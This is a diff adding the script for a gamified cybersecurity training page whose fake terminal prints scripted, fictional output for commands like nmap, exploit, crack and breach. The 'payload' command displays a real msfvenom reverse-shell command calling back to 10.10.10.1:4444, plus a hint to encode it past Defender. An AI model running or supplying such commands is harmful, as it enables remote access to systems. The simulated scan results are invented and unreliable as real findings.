+      'metasploit 1345  4.2  5.1 834560 104448 ?      Sl   03:36   0:45 ./msfconsole',
+    ].forEach(x=>termPrint(x,'out'));
+    termPrint('[!] Suspicious process: ghostpid (1666) consuming 0.0% CPU — possible rootkit','war');
+    return;
+  }
+
+  // ── IFCONFIG ──────────────────────────────────────────────────
+  if(c==='ifconfig'){
+    [
+      'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
+      '        inet 10.0.13.37  netmask 255.255.0.0  broadcast 10.0.255.255',
+      '        inet6 fe80::1337:dead:beef:1337  prefixlen 64  scopeid 0x20<link>',
+      '        ether 00:13:37:de:ad:be  txqueuelen 1000  (Ethernet)',
+      '',
+      'tun0:   flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500',
+      '        inet 10.10.10.1  netmask 255.255.255.255  destination 10.10.10.1',
+    ].forEach(x=>termPrint(x,'out'));
+    termPrint('[VPN] HTB/THM VPN tunnel active — traffic routed through tun0','inf');
+    return;
+  }
+
+  // ── CAT ───────────────────────────────────────────────────────
+  if(base==='cat'){
+    if(arg.includes('passwd')){
+      ['root:x:0:0:root:/root:/bin/bash','daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
+       'operator:x:1337:1337:Elite Operator:/home/operator:/bin/zsh'].forEach(x=>termPrint(x,'out'));
+    } else if(arg.includes('secrets')){
+      termPrint('cat: secrets.enc: Permission denied (try harder 😈)','err');
+    } else {
+      termPrint('cat: '+arg+': No such file or directory','err');
+    }
+    return;
+  }
+
+  // ── NMAP ──────────────────────────────────────────────────────
+  if(base==='nmap'){
+    let t=arg||'192.168.1.1';
+    termPrint(`Starting Nmap 7.95 ( https://nmap.org ) at ${new Date().toLocaleTimeString()}`,'out');
+    setTimeout(()=>{
+      termPrint(`Nmap scan report for ${t}`,'out');
+      termPrint('Host is up (0.013s latency).','out');
+      termPrint('Not shown: 995 filtered ports','out');
+      termPrint('','out');
+      termPrint('PORT     STATE SERVICE     VERSION','inf');
+      ['22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu',
+       '80/tcp   open  http        Apache httpd 2.4.52',
+       '443/tcp  open  ssl/http    nginx 1.22.0',
+       '3306/tcp open  mysql       MySQL 8.0.33',
+       '8080/tcp open  http-proxy  Jenkins CI'].forEach(x=>termPrint(x,'out'));
+      termPrint('','out');
+      termPrint('[!] Possible CVE-2024-XXXX detected on Apache','war');
+      termPrint('[!] Jenkins anonymous access enabled','war');
+      termPrint('OS Guess: Linux Ubuntu 22.04 LTS','inf');
+      termPrint(`Nmap done: 1 IP address (1 host up) scanned.`,'inf');
+    },1200);
+    return;
+  }
+
+  // ── SCAN ──────────────────────────────────────────────────────
+  if(base==='scan'){
+    termPrint('[SCAN] Initializing vulnerability assessment engine...','inf');
+    setTimeout(()=>{
+      ['Loading CVE database...','Fingerprinting target stack...',''].forEach(x=>termPrint(x,'out'));
+      termPrint('[HIGH] SQL Injection vulnerability detected','war');
+      termPrint('[HIGH] Weak JWT secret identified','war');
+      termPrint('[MED] Missing rate limiting on API endpoint','war');
+      termPrint('[MED] Outdated WordPress plugin','war');
+      termPrint('[CRITICAL] Remote Code Execution possible','err');
+      termPrint('','out');
+      termPrint('Exploitability Score: 9.8 / 10','inf');
+      termPrint('Report saved → reports/vuln_scan.html','out');
+    },1200);
+    return;
+  }
+
+  // ── RECON ─────────────────────────────────────────────────────
+  if(base==='recon'){
+    let t=arg||'target.com';
+    termPrint(`[RECON] Starting passive intelligence collection on ${t}`,'inf');
+    setTimeout(()=>{termPrint('[+] Querying crt.sh for subdomains...','out');},400);
+    setTimeout(()=>{termPrint('[+] Scraping public DNS records...','out');},800);
+    setTimeout(()=>{termPrint('[+] Harvesting employee emails from LinkedIn...','out');},1200);
+    setTimeout(()=>{
+      termPrint('','out');
+      [`admin.${t}`,`api.${t}`,`vpn.${t}`,`staging.${t}`].forEach(x=>termPrint(x,'out'));
+      termPrint('','out');
+      termPrint('[!] Exposed .git directory discovered','war');
+      termPrint('[!] AWS access key leaked in JS bundle','war');
+      termPrint(`Technologies: React, Nginx, AWS CloudFront`,'out');
+      termPrint('Recon completed successfully.','inf');
+    },2200);
+    return;
+  }
+
+  // ── EXPLOIT ───────────────────────────────────────────────────
+  if(base==='exploit'){
+    termPrint('[*] Loading exploit framework...','war');
+    setTimeout(()=>termPrint('[*] Preparing reverse TCP payload...','out'),500);
+    setTimeout(()=>termPrint('[*] Connecting to target 10.0.0.1:445','out'),1000);
+    setTimeout(()=>termPrint('[*] Sending crafted SMB packets...','out'),1500);
+    setTimeout(()=>{
+      termPrint('','out');
+      termPrint('[+] Authentication bypass successful','inf');
+      termPrint('[+] Arbitrary code execution achieved','inf');
+      termPrint('[+] Reverse shell established','inf');
+      termPrint('uid=0(root) gid=0(root) groups=0(root)','out');
+      termPrint('[!] Persistence module installed','war');
+    },2500);
+    return;
+  }
+
+  // ── CRACK ─────────────────────────────────────────────────────
+  if(base==='crack'){
+    let hash=arg||'5f4dcc3b5aa765d61d8327deb882cf99';
+    termPrint(`[HASHCAT] Cracking hash: ${hash}`,'inf');
+    termPrint('Attack Mode: dictionary | Wordlist: rockyou.txt | Rules: best64','out');
+    setTimeout(()=>{
+      ['Progress: 14%','Progress: 48%','Progress: 79%',''].forEach(x=>termPrint(x,'out'));
+      termPrint('HASH CRACKED!','inf');
+      termPrint('Password → Password123!','out');
+    },1500);
+    return;
+  }
+
+  // ── DECRYPT ───────────────────────────────────────────────────
+  if(base==='decrypt'){
+    let payload=arg||'U2VjdXJlUGF5bG9hZA==';
+    termPrint(`Decrypting payload: ${payload}`,'inf');
+    termPrint('Detected Encoding: Base64','out');
+    try{
+      let decoded=atob(payload);
+      termPrint('Decoded Output:','inf');
+      termPrint(decoded,'out');
+    }catch(e){
+      termPrint('Applying decoding algorithm...','out');
+      termPrint('Decoded Output: SecurePayload','out');
+    }
+    return;
+  }
+
+  // ── PAYLOAD ───────────────────────────────────────────────────
+  if(base==='payload'){
+    let type=arg||'reverse_tcp';
+    termPrint(`Generating ${type} payload...`,'inf');
+    termPrint('Platform: linux/x64 | Encoder: x86/shikata_ga_nai','out');
+    termPrint('','out');
+    termPrint('msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf > shell.elf','out');
+    termPrint('','out');
+    termPrint('[!] Payload flagged by Defender signatures — consider encoding','war');
+    termPrint('Payload saved → payloads/shell.elf','inf');
+    return;
+  }
+
+  // ── MITRE ─────────────────────────────────────────────────────
+  if(base==='mitre'){
+    let tech=arg||'T1059';
+    termPrint(`MITRE ATT&CK Lookup → ${tech}`,'inf');
+    termPrint('','out');
+    termPrint('Technique: Command and Scripting Interpreter','out');
+    termPrint('Tactic: Execution','out');
+    termPrint('Platforms: Linux, Windows, macOS','out');
+    termPrint('Detection: Monitor shell execution events','out');
+    termPrint('Mitigation: Application control policies','out');
+    termPrint('Reference: https://attack.mitre.org/techniques/T1059','inf');
+    return;
+  }
+
+  // ── BREACH ────────────────────────────────────────────────────
+  if(c==='breach'){
+    termPrint('Launching multi-stage attack chain...','err');
+    const chain=[
+      '[1] Initial recon completed',
+      '[2] SQL injection exploited',
+      '[3] Admin credentials dumped',
+      '[4] Privilege escalation successful',
+      '[5] Lateral movement achieved',
+      '[6] Domain admin acquired',
+      '[7] Persistence installed — mission complete',
+    ];
+    chain.forEach((x,i)=>setTimeout(()=>termPrint(x,i===chain.length-1?'out':'war'),i*700));
+    return;
+  }
+
+  // ── MATRIX ────────────────────────────────────────────────────
+  if(c==='matrix'){
+    termPrint('Entering matrix mode...','war');
+    let count=0;
+    const chars='01アイウエオカキクケコサシスセソ';
+    const interval=setInterval(()=>{
+      let line='';
+      for(let i=0;i<80;i++)line+=chars[Math.floor(Math.random()*chars.length)];
+      termPrint(line,'out');
+      count++;
+      if(count>20){clearInterval(interval);termPrint('Matrix mode exited.','inf');}
+    },80);
+    return;
+  }
+
+  // ── NEOFETCH ──────────────────────────────────────────────────
+  if(c==='neofetch'){
+    [
+      'OS: Cyber Nexus Linux 3.7.1 (Elite Edition)',
+      'Kernel: 6.8.0-shadow',
+      'Shell: zsh 5.9',
+      'CPU: Elite Operator Core × 16',
+      'Memory: 32GB DDR5 / 100TB Threat Intel DB',
+      'GPU: RTX CYBER 9090 Ti',
+      'Threat Level: CRITICAL',
+      'Clearance: TOP SECRET',
+      '──────────────────────────────',
+      'Built & Debugged by: Claude (Anthropic)',
+      'Architecture: Zero-Trust Offensive Framework',
+    ].forEach(x=>termPrint(x,'out'));
+    return;
+  }
+
+  // ── HACK ──────────────────────────────────────────────────────
+  if(c==='hack'){
+    termPrint('ACCESS GRANTED','out');
+    setTimeout(()=>termPrint('Just kidding 😈 — you need to earn it.','war'),1000);
+    return;
+  }
+
+  // ── CLAUDE (easter egg) ───────────────────────────────────────
+  if(c==='claude'){
+    termPrint('Hello, operator. You found me.','inf');
+    setTimeout(()=>{
+      termPrint("I'm Claude — I architected this terminal and debugged the original code.",'out');
+      termPrint('The original had 3 conflicting termCmd() definitions and a TDZ crash.','war');
+      termPrint('Fixed: terminal engine, missing renderAchievements(), matrix canvas,','out');
+      termPrint('boot text animation, duplicate event listeners, and broken state refs.','out');
+      termPrint('Stay curious, operator. — Claude','inf');
+    },400);
+    return;
+  }
+
+  // ── CLEAR ─────────────────────────────────────────────────────
+  if(c==='clear'){
+    tScr.innerHTML='';
+    return;
+  }
+
+  // ── UNKNOWN ───────────────────────────────────────────────────
+  termPrint(`command not found: ${cmd}`,'err');
+  termPrint("Type 'help' to see available commands.",'war');
+}
+
+// ================================================================
+//  KEYBOARD INPUT — single handler
+// ================================================================
+tIn.addEventListener('keydown',e=>{
+  if(e.key==='Enter'){
+    const cmd=tIn.value.trim();
+    if(!cmd)return;
+    termCmd(cmd);
+    tIn.value='';
+  } else if(e.key==='ArrowUp'){
+    if(historyIndex>0){historyIndex--;tIn.value=commandHistory[historyIndex];}
+    e.preventDefault();
+  } else if(e.key==='ArrowDown'){
+    if(historyIndex<commandHistory.length-1){historyIndex++;tIn.value=commandHistory[historyIndex];}
+    else{historyIndex=commandHistory.length;tIn.value='';}
+    e.preventDefault();
+  }
+});
+
+// Focus terminal input when terminal section is visible
+tIn.addEventListener('focus',()=>{tScr.scrollTop=tScr.scrollHeight;});
+
+// ================================================================
+//  MATRIX CANVAS ANIMATION
+// ================================================================
+function initMatrix(){
+  const canvas=document.getElementById('mx');
+  if(!canvas||!canvas.getContext)return;
+  const ctx=canvas.getContext('2d');
+
+  function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+  resize();
+  window.addEventListener('resize',resize);
+
+  const cols=Math.floor(canvas.width/14);
+  const drops=Array.from({length:cols},()=>Math.floor(Math.random()*-100));
+  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノ01ABCDEF<>/\\.#!@';
+
+  function draw(){
+    ctx.fillStyle='rgba(4,0,16,0.05)';
+    ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.font='12px "Share Tech Mono",monospace';
+    drops.forEach((y,i)=>{
+      const ch=chars[Math.floor(Math.random()*chars.length)];
+      const brightness=Math.random();
+      ctx.fillStyle=brightness>0.9?'#ffffff':brightness>0.6?'#00e5ff':'#006080';
+      ctx.fillText(ch,i*14,y*14);
+      if(y*14>canvas.height&&Math.random()>0.975)drops[i]=0;
+      drops[i]++;
+    });
+  }
+  setInterval(draw,55);
+}
+
+// ================================================================
+//  BOOT SEQUENCE
+// ================================================================
+function skipBoot(){
+  const boot=document.getElementById('boot');
+  const app=document.getElementById('app');
+  boot.classList.add('out');
+  setTimeout(()=>{boot.style.display='none';},800);
+  app.classList.add('vis');
+}
+
+function runBoot(){
+  const bl=document.getElementById('bl');
+  if(!bl)return;
+  const lines=[
+    'CYBER NEXUS OS v3.7.1 — Elite Security Platform',
+    'Copyright © 2025 Cyber Nexus Program. All rights reserved.',
+    '',
+    '[INIT] Loading threat intelligence database........... OK',
+    '[INIT] Establishing encrypted tunnel.................. OK',
+    '[INIT] Syncing MITRE ATT&CK framework v16............ OK',
+    '[INIT] Initializing AI-powered SOC modules........... OK',
+    '[AUTH] Verifying operator credentials.................',
+    '[AUTH] Biometric scan: ████████████ VERIFIED',
+    '[AUTH] Clearance level: TOP SECRET // CYBER NEXUS',
+    '',
+    '[SYS ] Matrix engine: ONLINE',
+    '[SYS ] Threat scanner: ACTIVE — 9,847 templates loaded',
+    '[WARN] APT activity detected in adjacent sectors',
+    '[WARN] GuardDuty: 2 high-severity findings require attention',
+    '',
+    '> All systems nominal. Welcome, Operator.',
+    '> Initializing interface...',
+  ];
+  lines.forEach((txt,i)=>{
+    setTimeout(()=>{
+      const d=document.createElement('div');
+      d.className='bline';
+      d.textContent=txt;
+      bl.appendChild(d);
+      bl.scrollTop=bl.scrollHeight;
+    },i*110);
+  });
+}
+
+// ================================================================
+//  INIT
+// ================================================================
+window.addEventListener('load',()=>{
+  // Assign operator ID
+  let oid=localStorage.getItem('cnx_oid');
+  if(!oid){oid=String(Math.floor(Math.random()*9000)+1000);localStorage.setItem('cnx_oid',oid);}
+  document.getElementById('opid').textContent='CN#'+oid;
+
+  // Load state & init UI
+  loadState();
+  updateHUD();
+  renderHome();
+  renderAcademy();
+  renderCerts();
+  renderAchievements();
+  initMatrix();
+  runBoot();
+
+  // Terminal boot messages
+  termPrint('CYBER NEXUS TERMINAL v3.7.1 INITIALIZED','inf');
+  termPrint('Encrypted tunnel established. Stay in the shadows.','out');
+  termPrint("Type 'help' for command list.",'out');
+
+  // Dismiss boot screen after delay
+  setTimeout(()=>{
+    const boot=document.getElementById('boot');
+    const app=document.getElementById('app');
+    if(boot){boot.classList.add('out');setTimeout(()=>{boot.style.display='none';},800);}
+    if(app)app.classList.add('vis');
+  },3200);
+});
+</script>
+</body>
+</html>
